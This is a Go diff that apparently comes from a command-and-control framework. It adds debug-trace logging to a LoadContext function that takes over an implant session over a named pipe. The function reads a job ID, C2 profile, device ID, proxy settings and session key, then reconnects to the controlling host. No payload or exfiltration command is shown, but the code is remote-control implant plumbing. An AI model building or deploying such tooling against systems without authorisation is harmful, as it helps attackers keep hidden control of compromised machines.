@@ -180,7 +180,10 @@ func LoadContext(x context.Context, l logx.Log, n string, t time.Duration) (*Ses
 		return nil, xerr.Sub("no Profile parser loaded", 0x15)
 	}
 	if t == 0 {
-		t = time.Second * 5
+		t = spawnDefaultTime
+	}
+	if bugtrack.Enabled {
+		bugtrack.Track("c2.LoadContext(): Starting Pipe listen on %q.", n)
 	}
 	var (
 		y, f   = context.WithTimeout(x, t)
@@ -201,6 +204,9 @@ func LoadContext(x context.Context, l logx.Log, n string, t time.Duration) (*Ses
 	}()
 	select {
 	case c = <-z:
+		if bugtrack.Enabled {
+			bugtrack.Track("c2.LoadContext(): Received a connection on %q!.", n)
+		}
 	case <-y.Done():
 	case <-x.Done():
 		f()
@@ -209,6 +215,9 @@ func LoadContext(x context.Context, l logx.Log, n string, t time.Duration) (*Ses
 	}
 	v.Close()
 	if f(); c == nil {
+		if bugtrack.Enabled {
+			bugtrack.Track("c2.LoadContext(): No connection was found!")
+		}
 		return nil, ErrNoConn
 	}
 	var (
@@ -218,9 +227,11 @@ func LoadContext(x context.Context, l logx.Log, n string, t time.Duration) (*Ses
 		_   = buf[7]
 	)
 	// Set a connection deadline. I doubt this will fail, but let's be sure.
-	c.SetDeadline(time.Now().Add(spawnDefaultTime * 2))
+	c.SetDeadline(time.Now().Add(spawnDefaultTime))
 	if err = readFull(r, 3, buf[0:3]); err != nil {
-		c.Close()
+		if c.Close(); bugtrack.Enabled {
+			bugtrack.Track("c2.LoadContext(): Read JobID failed: %s", err.Error())
+		}
 		return nil, xerr.Wrap("read Job ID", err)
 	}
 	var (
@@ -229,15 +240,25 @@ func LoadContext(x context.Context, l logx.Log, n string, t time.Duration) (*Ses
 	)
 	b, err := readSlice(r, &buf)
 	if err != nil {
-		c.Close()
+		if c.Close(); bugtrack.Enabled {
+			bugtrack.Track("c2.LoadContext(): Read Profile failed: %s", err.Error())
+		}
 		return nil, xerr.Wrap("read Profile", err)
 	}
 	var p Profile
 	if p, err = ProfileParser(b); err != nil {
-		c.Close()
+		if c.Close(); bugtrack.Enabled {
+			bugtrack.Track("c2.LoadContext(): ParseProfile failed: %s", err.Error())
+		}
 		return nil, xerr.Wrap("parse Profile", err)
 	}
+	if bugtrack.Enabled {
+		bugtrack.Track("c2.LoadContext(): JobID %d, Spawn = %t.", u, g)
+	}
 	if b = nil; g { // Spawn
+		if bugtrack.Enabled {
+			bugtrack.Track("c2.LoadContext(): Starting Spawn!")
+		}
 		var s *Session
 		if s, err = ConnectContext(x, l, p); err == nil {
 			buf[0], buf[1] = 'O', 'K'
@@ -249,12 +270,16 @@ func LoadContext(x context.Context, l logx.Log, n string, t time.Duration) (*Ses
 	}
 	var i device.ID
 	if err = i.Read(r); err != nil {
-		c.Close()
+		if c.Close(); bugtrack.Enabled {
+			bugtrack.Track("c2.LoadContext(): Read ID failed: %s", err.Error())
+		}
 		return nil, xerr.Wrap("read ID", err)
 	}
 	q, err := readProxyInfo(r, &buf)
 	if err != nil {
-		c.Close()
+		if c.Close(); bugtrack.Enabled {
+			bugtrack.Track("c2.LoadContext(): Read Proxy failed: %s", err.Error())
+		}
 		return nil, xerr.Wrap("read Proxy", err)
 	}
 	copy(local.UUID[:], i[:])
@@ -265,24 +290,36 @@ func LoadContext(x context.Context, l logx.Log, n string, t time.Duration) (*Ses
 	)
 	// KeyCrypt: Migration data to transfer the Session key.
 	if err = readFull(r, data.KeySize, s.key[:]); err != nil {
-		c.Close()
+		if c.Close(); bugtrack.Enabled {
+			bugtrack.Track("c2.LoadContext(): Read Session Key failed: %s", err.Error())
+		}
 		return nil, xerr.Wrap("read Session Key", err)
 	}
 	if h, s.w, s.t = p.Next(); len(h) == 0 {
-		c.Close()
+		if c.Close(); bugtrack.Enabled {
+			bugtrack.Track("c2.LoadContext(): Empty/nil Host received.")
+		}
 		return nil, ErrNoHost
 	}
 	s.host.Set(h)
 	buf[0], buf[1], buf[2], buf[3] = 'O', 'K', 0, 0
 	if err = writeFull(w, 2, buf[0:2]); err != nil {
-		c.Close()
+		if c.Close(); bugtrack.Enabled {
+			bugtrack.Track("c2.LoadContext(): Write OK failed: %s", err.Error())
+		}
 		return nil, xerr.Wrap("write OK", err)
 	}
 	if err = readFull(r, 2, buf[2:4]); err != nil {
+		if c.Close(); bugtrack.Enabled {
+			bugtrack.Track("c2.LoadContext(): Read OK failed: %s", err.Error())
+		}
 		return nil, xerr.Wrap("read OK", err)
 	}
 	w.Close()
 	if c.Close(); buf[2] != 'O' && buf[3] != 'K' {
+		if bugtrack.Enabled {
+			bugtrack.Track("c2.LoadContext(): Bad OK value received.")
+		}
 		return nil, xerr.Sub("unexpected OK value", 0x16)
 	}
 	if s.log, s.sleep = cout.New(l), p.Sleep(); s.sleep <= 0 {
@@ -299,6 +336,9 @@ func LoadContext(x context.Context, l logx.Log, n string, t time.Duration) (*Ses
 	)
 	s.Device.MarshalStream(o)
 	if k, err = p.Connect(x, s.host.String()); err != nil {
+		if bugtrack.Enabled {
+			bugtrack.Track("c2.LoadContext(): First Connect failed: %s", err.Error())
+		}
 		return nil, xerr.Wrap("first Connect", err)
 	}
 	// KeyCrypt: Encrypt first packet
@@ -306,7 +346,9 @@ func LoadContext(x context.Context, l logx.Log, n string, t time.Duration) (*Ses
 	// Set an initial write deadline, to make sure that the connection is stable.
 	k.SetWriteDeadline(time.Now().Add(spawnDefaultTime))
 	if err = writePacket(k, s.w, s.t, o); err != nil {
-		k.Close()
+		if k.Close(); bugtrack.Enabled {
+			bugtrack.Track("c2.LoadContext(): First Packet write failed: %s", err.Error())
+		}
 		return nil, xerr.Wrap("first Packet write", err)
 	}
 	o.Clear()
@@ -314,6 +356,9 @@ func LoadContext(x context.Context, l logx.Log, n string, t time.Duration) (*Ses
 	k.SetReadDeadline(time.Now().Add(spawnDefaultTime))
 	o, err = readPacket(k, s.w, s.t)
 	if k.Close(); err != nil {
+		if bugtrack.Enabled {
+			bugtrack.Track("c2.LoadContext(): First Packet read failed: %s", err.Error())
+		}
 		return nil, xerr.Wrap("first Packet read", err)
 	}
 	// KeyCrypt: Decrypt first packet
@@ -322,20 +367,30 @@ func LoadContext(x context.Context, l logx.Log, n string, t time.Duration) (*Ses
 	s.frags, s.m = make(map[uint16]*cluster), make(eventer, maxEvents)
 	s.ctx, s.send, s.tick = x, make(chan *com.Packet, 256), time.NewTicker(s.sleep)
 	if err = receive(s, nil, o); err != nil {
+		if bugtrack.Enabled {
+			bugtrack.Track("c2.LoadContext(): First Receive failed: %s", err.Error())
+		}
 		return nil, xerr.Wrap("first receive", err)
 	}
 	if len(q) > 0 {
 		var z Profile
 		for i := range q {
 			if z, err = ProfileParser(q[i].p); err != nil {
-				s.Close()
+				if s.Close(); bugtrack.Enabled {
+					bugtrack.Track("c2.LoadContext(): Proxy Profile Parse failed: %s", err.Error())
+				}
 				return nil, xerr.Wrap("parse Proxy Profile", err)
 			}
 			if _, err = s.NewProxy(q[i].n, q[i].b, z); err != nil {
-				s.Close()
+				if s.Close(); bugtrack.Enabled {
+					bugtrack.Track("c2.LoadContext(): Proxy Setup failed: %s", err.Error())
+				}
 				return nil, xerr.Wrap("setup Proxy", err)
 			}
 		}
+	}
+	if bugtrack.Enabled {
+		bugtrack.Track("c2.LoadContext(): Done, Resuming operatons!")
 	}
 	s.wait()
 	go s.listen()
